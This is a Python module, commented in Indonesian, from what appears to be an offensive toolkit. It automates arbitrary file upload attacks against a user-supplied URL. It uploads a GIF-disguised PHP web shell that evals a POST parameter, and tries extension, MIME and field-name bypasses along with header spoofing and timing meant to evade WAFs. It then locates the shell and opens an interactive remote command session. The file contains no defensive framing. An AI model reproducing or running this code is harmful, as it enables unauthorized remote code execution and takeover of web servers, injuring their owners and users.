"""Modul Advanced Arbitrary File Upload — pindahan dari main.py legacy.

Perubahan dari legacy:
  [FIX] custom_headers sekarang BENAR-BENAR dikirim ke requests.post().
        Di legacy, headers disiapkan tapi tidak dipakai → WAF bypass tidak aktif.
  [FIX] verify=False eksplisit (biar konsisten dengan modul lain di v2).

Semua logika eksploitasi lain: IDENTIK dengan legacy.
"""
import random
import re
import string
import time

import requests


def run_upload_module():
    print("-" * 60)
    print(" [ Modul: Enterprise Arbitrary File Upload & Polyglot Engine ]")
    print("-" * 60)
    target_url = input("[?] Masukkan URL target upload (contoh: http://target.com/upload.php): ").strip()

    common_fields = [
        "fileToUpload", "file", "uploaded_file", "img", "image", "pic", "picture",
        "media", "attachment", "file_data", "user_file", "profile_pic", "resume", "cv", "doc"
    ]

    extension_variants = [
        {"ext": ".php", "desc": "Standard PHP"},
        {"ext": ".php5", "desc": "PHP5 Extension"},
        {"ext": ".phtml", "desc": "PHTML Extension"},
        {"ext": ".phar", "desc": "PHAR Extension"},
        {"ext": ".Php", "desc": "Mixed Case .Php"},
        {"ext": ".php.jpg", "desc": "Double Ext .php.jpg"},
        {"ext": ".jpg.php", "desc": "Inverted Double Ext .jpg.php"}
    ]

    mime_variants = [
        "image/gif", "image/jpeg", "image/png", "application/octet-stream"
    ]

    base_url = target_url.rsplit('/', 1)[0]
    shell_signature = "TànPhá-Enterprise-Shell-Active"

    # POLYGLOT MAGIC BYTES SPOOFING
    cmd_var = "$_POST['cmd']"
    polyglot_payload = b"GIF89a;\n" + f"<?php echo '{shell_signature}'; @eval({cmd_var}); ?>".encode('utf-8')

    success = False
    verified_shell_url = ""

    print(f"\n[*] Memulai Polyglot Stealth Upload dengan Magic Bytes Spoofing...")

    for field in common_fields:
        if success:
            break
        for variant in extension_variants:
            if success:
                break
            for mime in mime_variants:
                rand_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
                p_name = f"shell_{rand_name}{variant['ext']}"

                print(f"[*] Testing -> Field: [{field}] | Bypass: {variant['desc']} | MIME: {mime}")

                boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
                custom_headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                    "X-Forwarded-For": "127.0.0.1"
                }

                files = {field: (p_name, polyglot_payload, mime)}

                try:
                    time.sleep(random.uniform(0.2, 0.6))

                    # ============================================================
                    # [FIX] custom_headers disiapkan tapi TIDAK dipakai di legacy.
                    # v2   : tambahkan headers=custom_headers + verify=False.
                    # ============================================================
                    response = requests.post(
                        target_url,
                        files=files,
                        headers=custom_headers,
                        timeout=6,
                        verify=False,
                    )

                    if response.status_code in [200, 201, 302]:
                        detected_path = None
                        response_text = response.text

                        path_matches = re.findall(
                            r'(?:uploads|files|images|media|assets|content)/[a-zA-Z0-9_\-/]+\.[a-z]+',
                            response_text,
                        )
                        if path_matches:
                            detected_path = base_url + "/" + path_matches[0]

                        possible_dirs = [
                            detected_path,
                            base_url + "/uploads/" + p_name,
                            base_url + "/upload/" + p_name,
                            base_url + "/files/" + p_name,
                            base_url + "/assets/" + p_name,
                            base_url + "/" + p_name,
                        ]
                        possible_dirs = [d for d in possible_dirs if d]

                        for check_url in possible_dirs:
                            check_url = check_url.replace(":/", "://") if "://" not in check_url else check_url

                            try:
                                check_response = requests.get(check_url, timeout=4, verify=False)
                                if shell_signature in check_response.text:
                                    print(f"\n[+] TARGET FILE UPLOAD BERHASIL DITEMBUS & DIVERIFIKASI!")
                                    print(f"    - Field Parameter : {field}")
                                    print(f"    - Teknik Bypass   : {variant['desc']} + Magic Bytes")
                                    print(f"    - Web Shell Aktif : {check_url}")
                                    verified_shell_url = check_url
                                    success = True
                                    break
                            except Exception:
                                continue
                except Exception:
                    pass

    # AUTO-INTERACTIVE SHELL DROP
    if success:
        print("\n[***] MENGAKTIFKAN AUTO-INTERACTIVE SHELL SESSION [***]")
        print("[*] Sesi terhubung ke web shell target. Ketik perintah sistem atau 'exit' untuk keluar.\n")

        shell_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TànPhá-Polyglot-Engine"
        }

        while True:
            try:
                command = input("TànPhá-UploadShell# ").strip()
                if not command:
                    continue
                if command.lower() == 'exit':
                    print("[*] Keluar dari sesi interaktif web shell.")
                    break

                post_data = {"cmd": command}
                res = requests.post(
                    verified_shell_url,
                    data=post_data,
                    headers=shell_headers,
                    timeout=6,
                    verify=False,
                )

                print("\n--- Output Eksekusi Target ---")
                print(res.text.replace(shell_signature, "").strip())
                print("-------------------------------\n")

            except KeyboardInterrupt:
                print("\n[*] Sesi dihentikan oleh pengguna.")
                break
            except Exception as e:
                print(f"[-] Gagal mengirim perintah ke shell: {e}")
    else:
        print("\n[-] Semua kombinasi Polyglot Upload & Magic Bytes telah diuji, target terproteksi ketat.")

    input("\nTekan Enter untuk kembali ke menu utama...")
